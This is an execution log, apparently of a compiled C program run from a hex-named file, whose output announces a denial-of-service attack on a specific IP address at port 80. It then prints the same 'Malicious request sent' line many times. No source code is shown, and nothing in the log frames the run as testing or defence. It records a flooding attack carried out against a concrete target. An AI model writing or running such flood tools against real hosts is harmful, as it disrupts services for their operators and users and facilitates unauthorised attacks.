Started at: 2025-08-23 22:06:03.173209
Command: gcc 2ea8f92c.c -o 2ea8f92c && ./2ea8f92c
--------------------------------------------------
[+] Launching DoS attack against 185.20.117.129:80
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
[+] Malicious request sent.
